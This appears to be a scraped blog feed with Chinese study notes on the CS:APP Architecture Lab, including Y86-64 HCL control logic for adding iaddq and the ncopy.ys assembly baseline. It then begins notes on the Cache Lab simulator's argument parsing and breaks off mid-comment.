class="hljs-keyword">in</span> &#123; IRET, IPOPQ &#125; : <span class="hljs-number">8</span>;<br><span class="hljs-comment"># Other instructions don&#x27;t need ALU</span><br>];<br><br><span class="hljs-comment">## Select input B to ALU</span><br>word aluB = [<br>icode <span class="hljs-keyword">in</span> &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, <br>      IPUSHQ, IRET, IPOPQ, IIADDQ&#125; : valB;<br>icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ, IIRMOVQ &#125; : <span class="hljs-number">0</span>;<br><span class="hljs-comment"># Other instructions don&#x27;t need ALU</span><br>];<br><br><span class="hljs-comment">## Set the ALU function</span><br>word alufun = [<br>icode == IOPQ : ifun;<br><span class="hljs-number">1</span> : ALUADD;<br>];<br><br><span class="hljs-comment">## Should the condition codes be updated?</span><br>bool set_cc = icode <span class="hljs-keyword">in</span> &#123; IOPQ, IIADDQ&#125;;<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#### Memory Stage    ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><br><span class="hljs-comment">## Set read control signal</span><br>bool mem_read = icode <span class="hljs-keyword">in</span> &#123; IMRMOVQ, IPOPQ, IRET &#125;;<br><br><span class="hljs-comment">## Set write control signal</span><br>bool mem_write = icode <span class="hljs-keyword">in</span> &#123; IRMMOVQ, IPUSHQ, ICALL &#125;;<br><br><span class="hljs-comment">## Select memory address</span><br>word mem_addr = [<br>icode <span class="hljs-keyword">in</span> &#123; IRMMOVQ, IPUSHQ, ICALL, IMRMOVQ &#125; : valE;<br>icode <span class="hljs-keyword">in</span> &#123; IPOPQ, IRET &#125; : valA;<br><span class="hljs-comment"># Other instructions don&#x27;t need address</span><br>];<br><br><span class="hljs-comment">## Select memory input data</span><br>word mem_data = [<br><span class="hljs-comment"># Value from register</span><br>icode <span class="hljs-keyword">in</span> &#123; IRMMOVQ, IPUSHQ &#125; : valA;<br><span class="hljs-comment"># Return PC</span><br>icode == ICALL : valP;<br><span class="hljs-comment"># Default: Don&#x27;t write anything</span><br>];<br><br><span class="hljs-comment">## Determine instruction status</span><br>word Stat = [<br>imem_error || dmem_error : SADR;<br>!instr_valid: SINS;<br>icode == IHALT : SHLT;<br><span class="hljs-number">1</span> : SAOK;<br>];<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#### Program Counter Update ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#</span><br><br><span class="hljs-comment">## What address should instruction be fetched at</span><br><br>word new_pc = [<br><span class="hljs-comment"># Call.  Use instruction constant</span><br>icode == ICALL : valC;<br><span class="hljs-comment"># Taken branch.  Use instruction constant</span><br>icode == IJXX &amp;&amp; Cnd : valC;<br><span class="hljs-comment"># Completion of RET instruction.  Use value from stack</span><br>icode == IRET : valM;<br><span class="hljs-comment"># Default: Use incremented PC</span><br><span class="hljs-number">1</span> : valP;<br>];<br><span class="hljs-comment">#/* $end seq-all-hcl */</span><br></code></pre></td></tr></table></figure><h2 id="part-c">Part C</h2><p>F - D - E - M - W</p><p>对其中设计的存储设备的值的逻辑进行设计。</p><p>基本的流水线操作：Average CPE 15.18</p><p>可以优化的结构：</p><p>Prediction</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs asm">#/* $begin ncopy-ys */<br>##################################################################<br># ncopy.ys - Copy a src block of len words to dst.<br># Return the number of positive words (&gt;0) contained in src.<br>#<br># Include your name and ID here.<br>#<br># Describe how and why you modified the baseline code.<br>#<br>##################################################################<br># Do not modify this portion<br># Function prologue.<br># %rdi = src, %rsi = dst, %rdx = len<br>ncopy:<br><br>##################################################################<br># You can modify this portion<br># Loop header<br>xorq %rax,%rax# count = 0;<br>andq %rdx,%rdx# len &lt;= 0?<br>jle Done# if so, goto Done:<br><br>Loop:<br>    mrmovq (%rdi), %r10# read val from src...<br>rmmovq %r10, (%rsi)# ...and store it to dst<br>andq %r10, %r10# val &lt;= 0?<br>jle Npos# if so, goto Npos:<br>irmovq $1, %r10<br>addq %r10, %rax# count++<br><br>Npos:<br>irmovq $1, %r10<br>subq %r10, %rdx# len--<br>irmovq $8, %r10<br>addq %r10, %rdi# src++<br>addq %r10, %rsi# dst++<br>andq %rdx,%rdx# len &gt; 0?<br>jg Loop# if so, goto Loop:<br>##################################################################<br># Do not modify the following section of code<br># Function epilogue.<br>Done:<br>ret<br>##################################################################<br># Keep the following label at the end of your function<br>End:<br>#/* $end ncopy-ys */<br><br></code></pre></td></tr></table></figure><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-comment">#/* $begin seq-all-hcl */</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#  HCL Description of Control for Single Cycle Y86-64 Processor SEQ   #</span><br><span class="hljs-comment">#  Copyright (C) Randal E. Bryant, David R. O&#x27;Hallaron, 2010       #</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><br><span class="hljs-comment">## Your task is to implement the iaddq instruction</span><br><span class="hljs-comment">## The file contains a declaration of the icodes</span><br><span class="hljs-comment">## for iaddq (IIADDQ)</span><br><span class="hljs-comment">## Your job is to add the rest of the logic to make it work</span><br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#    C Include&#x27;s.  Don&#x27;t alter these                               #</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><br>quote <span class="hljs-string">&#x27;#include &lt;stdio.h&gt;&#x27;</span><br>quote <span class="hljs-string">&#x27;#include &quot;isa.h&quot;&#x27;</span><br>quote <span class="hljs-string">&#x27;#include &quot;sim.h&quot;&#x27;</span><br>quote <span class="hljs-string">&#x27;int sim_main(int argc, char *argv[]);&#x27;</span><br>quote <span class="hljs-string">&#x27;word_t gen_pc()&#123;return 0;&#125;&#x27;</span><br>quote <span class="hljs-string">&#x27;int main(int argc, char *argv[])&#x27;</span><br>quote <span class="hljs-string">&#x27;  &#123;plusmode=0;return sim_main(argc,argv);&#125;&#x27;</span><br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#    Declarations.  Do not change/remove/delete any of these       #</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><br><span class="hljs-comment">##### Symbolic representation of Y86-64 Instruction Codes ###</span><span class="hljs-comment">######</span><span class="hljs-comment">####</span><br><span class="hljs-comment">wordsig INOP &#x27;I_NOP&#x27;</span><br><span class="hljs-comment">wordsig IHALT&#x27;I_HALT&#x27;</span><br><span class="hljs-comment">wordsig IRRMOVQ&#x27;I_RRMOVQ&#x27;</span><br><span class="hljs-comment">wordsig IIRMOVQ&#x27;I_IRMOVQ&#x27;</span><br><span class="hljs-comment">wordsig IRMMOVQ&#x27;I_RMMOVQ&#x27;</span><br><span class="hljs-comment">wordsig IMRMOVQ&#x27;I_MRMOVQ&#x27;</span><br><span class="hljs-comment">wordsig IOPQ&#x27;I_ALU&#x27;</span><br><span class="hljs-comment">wordsig IJXX&#x27;I_JMP&#x27;</span><br><span class="hljs-comment">wordsig ICALL&#x27;I_CALL&#x27;</span><br><span class="hljs-comment">wordsig IRET&#x27;I_RET&#x27;</span><br><span class="hljs-comment">wordsig IPUSHQ&#x27;I_PUSHQ&#x27;</span><br><span class="hljs-comment">wordsig IPOPQ&#x27;I_POPQ&#x27;</span><br><span class="hljs-comment"># Instruction code for iaddq instruction</span><br><span class="hljs-comment">wordsig IIADDQ&#x27;I_IADDQ&#x27;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">###</span><span class="hljs-comment">## Symbolic represenations of Y86-64 function codes                  #####</span><br>wordsig FNONE    <span class="hljs-string">&#x27;F_NONE&#x27;</span>        <span class="hljs-comment"># Default function code</span><br><br><span class="hljs-comment">##### Symbolic representation of Y86-64 Registers referenced explicitly ###</span><span class="hljs-comment">##</span><br>wordsig RRSP     <span class="hljs-string">&#x27;REG_RSP&#x27;</span>    <span class="hljs-comment"># Stack Pointer</span><br>wordsig RNONE    <span class="hljs-string">&#x27;REG_NONE&#x27;</span>   <span class="hljs-comment"># Special value indicating &quot;no register&quot;</span><br><br><span class="hljs-comment">##### ALU Functions referenced explicitly                            ###</span><span class="hljs-comment">##</span><br>wordsig ALUADD<span class="hljs-string">&#x27;A_ADD&#x27;</span><span class="hljs-comment"># ALU should add its arguments</span><br><br><span class="hljs-comment">##### Possible instruction status values                             ###</span><span class="hljs-comment">##</span><br>wordsig SAOK<span class="hljs-string">&#x27;STAT_AOK&#x27;</span><span class="hljs-comment"># Normal execution</span><br>wordsig SADR<span class="hljs-string">&#x27;STAT_ADR&#x27;</span><span class="hljs-comment"># Invalid memory address</span><br>wordsig SINS<span class="hljs-string">&#x27;STAT_INS&#x27;</span><span class="hljs-comment"># Invalid instruction</span><br>wordsig SHLT<span class="hljs-string">&#x27;STAT_HLT&#x27;</span><span class="hljs-comment"># Halt instruction encountered</span><br><br><span class="hljs-comment">##### Signals that can be referenced by control logic ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#####</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">###</span><span class="hljs-comment">## Fetch stage inputs#####</span><br>wordsig pc <span class="hljs-string">&#x27;pc&#x27;</span><span class="hljs-comment"># Program counter</span><br><span class="hljs-comment">##### Fetch stage computations###</span><span class="hljs-comment">##</span><br>wordsig imem_icode <span class="hljs-string">&#x27;imem_icode&#x27;</span><span class="hljs-comment"># icode field from instruction memory</span><br>wordsig imem_ifun  <span class="hljs-string">&#x27;imem_ifun&#x27;</span> <span class="hljs-comment"># ifun field from instruction memory</span><br>wordsig icode  <span class="hljs-string">&#x27;icode&#x27;</span><span class="hljs-comment"># Instruction control code</span><br>wordsig ifun  <span class="hljs-string">&#x27;ifun&#x27;</span><span class="hljs-comment"># Instruction function</span><br>wordsig rA  <span class="hljs-string">&#x27;ra&#x27;</span><span class="hljs-comment"># rA field from instruction</span><br>wordsig rB  <span class="hljs-string">&#x27;rb&#x27;</span><span class="hljs-comment"># rB field from instruction</span><br>wordsig valC  <span class="hljs-string">&#x27;valc&#x27;</span><span class="hljs-comment"># Constant from instruction</span><br>wordsig valP  <span class="hljs-string">&#x27;valp&#x27;</span><span class="hljs-comment"># Address of following instruction</span><br>boolsig imem_error <span class="hljs-string">&#x27;imem_error&#x27;</span><span class="hljs-comment"># Error signal from instruction memory</span><br>boolsig instr_valid <span class="hljs-string">&#x27;instr_valid&#x27;</span><span class="hljs-comment"># Is fetched instruction valid?</span><br><br><span class="hljs-comment">##### Decode stage computations###</span><span class="hljs-comment">##</span><br>wordsig valA<span class="hljs-string">&#x27;vala&#x27;</span><span class="hljs-comment"># Value from register A port</span><br>wordsig valB<span class="hljs-string">&#x27;valb&#x27;</span><span class="hljs-comment"># Value from register B port</span><br><br><span class="hljs-comment">##### Execute stage computations###</span><span class="hljs-comment">##</span><br>wordsig valE<span class="hljs-string">&#x27;vale&#x27;</span><span class="hljs-comment"># Value computed by ALU</span><br>boolsig Cnd<span class="hljs-string">&#x27;cond&#x27;</span><span class="hljs-comment"># Branch test</span><br><br><span class="hljs-comment">##### Memory stage computations###</span><span class="hljs-comment">##</span><br>wordsig valM<span class="hljs-string">&#x27;valm&#x27;</span><span class="hljs-comment"># Value read from memory</span><br>boolsig dmem_error <span class="hljs-string">&#x27;dmem_error&#x27;</span><span class="hljs-comment"># Error signal from data memory</span><br><br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#    Control Signal Definitions.                                   #</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#### Fetch Stage     ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><br><span class="hljs-comment"># Determine instruction code</span><br>word icode = [<br>imem_error: INOP;<br><span class="hljs-number">1</span>: imem_icode;<span class="hljs-comment"># Default: get from instruction memory</span><br>];<br><br><span class="hljs-comment"># Determine instruction function</span><br>word ifun = [<br>imem_error: FNONE;<br><span class="hljs-number">1</span>: imem_ifun;<span class="hljs-comment"># Default: get from instruction memory</span><br>];<br><br>bool instr_valid = icode <span class="hljs-keyword">in</span> <br>&#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,<br>       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ&#125;;<br><br><span class="hljs-comment"># Does fetched instruction require a regid byte?</span><br>bool need_regids =<br>icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, <br>     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ&#125;;<br><br><span class="hljs-comment"># Does fetched instruction require a constant word?</span><br>bool need_valC =<br>icode <span class="hljs-keyword">in</span> &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ&#125;;<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#### Decode Stage    ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><br><span class="hljs-comment">## What register should be used as the A source?</span><br>word srcA = [<br>icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  &#125; : rA;<br>icode <span class="hljs-keyword">in</span> &#123; IPOPQ, IRET &#125; : RRSP;<br><span class="hljs-number">1</span> : RNONE; <span class="hljs-comment"># Don&#x27;t need register</span><br>];<br><br><span class="hljs-comment">## What register should be used as the B source?</span><br>word srcB = [<br>icode <span class="hljs-keyword">in</span> &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ&#125; : rB;<br>icode <span class="hljs-keyword">in</span> &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;<br><span class="hljs-number">1</span> : RNONE;  <span class="hljs-comment"># Don&#x27;t need register</span><br>];<br><br><span class="hljs-comment">## What register should be used as the E destination?</span><br>word dstE = [<br>icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB;<br>icode <span class="hljs-keyword">in</span> &#123; IIRMOVQ, IOPQ, IIADDQ&#125; : rB;<br>icode <span class="hljs-keyword">in</span> &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;<br><span class="hljs-number">1</span> : RNONE;  <span class="hljs-comment"># Don&#x27;t write any register</span><br>];<br><br><span class="hljs-comment">## What register should be used as the M destination?</span><br>word dstM = [<br>icode <span class="hljs-keyword">in</span> &#123; IMRMOVQ, IPOPQ &#125; : rA;<br><span class="hljs-number">1</span> : RNONE;  <span class="hljs-comment"># Don&#x27;t write any register</span><br>];<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#### Execute Stage   ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><br><span class="hljs-comment">## Select input A to ALU</span><br>word aluA = [<br>icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ, IOPQ &#125; : valA;<br>icode <span class="hljs-keyword">in</span> &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125; : valC;<br>icode <span class="hljs-keyword">in</span> &#123; ICALL, IPUSHQ &#125; : <span class="hljs-number">-8</span>;<br>icode <span class="hljs-keyword">in</span> &#123; IRET, IPOPQ &#125; : <span class="hljs-number">8</span>;<br><span class="hljs-comment"># Other instructions don&#x27;t need ALU</span><br>];<br><br><span class="hljs-comment">## Select input B to ALU</span><br>word aluB = [<br>icode <span class="hljs-keyword">in</span> &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, <br>      IPUSHQ, IRET, IPOPQ, IIADDQ&#125; : valB;<br>icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ, IIRMOVQ &#125; : <span class="hljs-number">0</span>;<br><span class="hljs-comment"># Other instructions don&#x27;t need ALU</span><br>];<br><br><span class="hljs-comment">## Set the ALU function</span><br>word alufun = [<br>icode == IOPQ : ifun;<br><span class="hljs-number">1</span> : ALUADD;<br>];<br><br><span class="hljs-comment">## Should the condition codes be updated?</span><br>bool set_cc = icode <span class="hljs-keyword">in</span> &#123; IOPQ, IIADDQ&#125;;<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#### Memory Stage    ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><br><span class="hljs-comment">## Set read control signal</span><br>bool mem_read = icode <span class="hljs-keyword">in</span> &#123; IMRMOVQ, IPOPQ, IRET &#125;;<br><br><span class="hljs-comment">## Set write control signal</span><br>bool mem_write = icode <span class="hljs-keyword">in</span> &#123; IRMMOVQ, IPUSHQ, ICALL &#125;;<br><br><span class="hljs-comment">## Select memory address</span><br>word mem_addr = [<br>icode <span class="hljs-keyword">in</span> &#123; IRMMOVQ, IPUSHQ, ICALL, IMRMOVQ &#125; : valE;<br>icode <span class="hljs-keyword">in</span> &#123; IPOPQ, IRET &#125; : valA;<br><span class="hljs-comment"># Other instructions don&#x27;t need address</span><br>];<br><br><span class="hljs-comment">## Select memory input data</span><br>word mem_data = [<br><span class="hljs-comment"># Value from register</span><br>icode <span class="hljs-keyword">in</span> &#123; IRMMOVQ, IPUSHQ &#125; : valA;<br><span class="hljs-comment"># Return PC</span><br>icode == ICALL : valP;<br><span class="hljs-comment"># Default: Don&#x27;t write anything</span><br>];<br><br><span class="hljs-comment">## Determine instruction status</span><br>word Stat = [<br>imem_error || dmem_error : SADR;<br>!instr_valid: SINS;<br>icode == IHALT : SHLT;<br><span class="hljs-number">1</span> : SAOK;<br>];<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#### Program Counter Update ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#</span><br><br><span class="hljs-comment">## What address should instruction be fetched at</span><br><br>word new_pc = [<br><span class="hljs-comment"># Call.  Use instruction constant</span><br>icode == ICALL : valC;<br><span class="hljs-comment"># Taken branch.  Use instruction constant</span><br>icode == IJXX &amp;&amp; Cnd : valC;<br><span class="hljs-comment"># Completion of RET instruction.  Use value from stack</span><br>icode == IRET : valM;<br><span class="hljs-comment"># Default: Use incremented PC</span><br><span class="hljs-number">1</span> : valP;<br>];<br><span class="hljs-comment">#/* $end seq-all-hcl */</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS:APP Cache Lab记录</title>
    <link href="/2023/06/27/cache/"/>
    <url>/2023/06/27/cache/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识">前置知识</h1><h2 id="多级缓存">多级缓存</h2><p>本质是基于代码运行时的时间局部性与空间局部性，往往顺序取指令，顺序访问内存中的元素，一段时间内选择的内存区域也往往相同。</p><h1 id="具体流程">具体流程</h1><h2 id="part-a">Part A</h2><p><img src="/images/cache-1.png" alt="cache结构" style="zoom:50%;"/></p><p>在c语言的文件中模拟出以上结构的二级缓存。该实验只模拟数据Cache，因此忽视I开头的请求，只需要考虑Lload，读取数据；S store 存储数据；M modify load 后store。-v不必要但有助于debug</p><h3 id="提取参数">提取参数</h3><p>需要有两个可选择的功能，四个必要的参数。若缺少参数时需要打印Usage、option，只要含有-h只打印帮助。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Get_opt API 处理不同参数的情况</span><br><span class="hljs-comment">// 注意if处理的先后对命令行的影响</span><br><span class="hljs-comment">// 比如在最后加入一个多余的参数，尽管其他条件都符合 都不会执行</span><br><br><span class="hljs-comment">//if there exists -h</span><br><span class="hljs-comment">// &quot;Usage&quot; </span><br><span class="hljs-comment">// return 0 </span><br><br><span class="hljs-comment">//if there dosen&#x27;t exist four valid mandatory parameters </span><br><span class="hljs-comment">// ? 缺少定义 重复定义 出现不合规的定义 -&gt; 借助Get_opt处理  </span><br><span class="hljs-comment">// &quot;./csim: Missing required command line argument&quot;</span><br><span class="hljs-comment">// &quot;Usage&quot;</span><br><span class="hljs-comment">// return 0  </span><br><br><span class="hljs-comment">//  if there exist invalid option</span><br><span class="hljs-comment">//存在多余的参数</span><br><span class="hljs-comment">// &quot;./csim: invalid option -- &#x27;f&#x27;&quot; (order of apperance in command 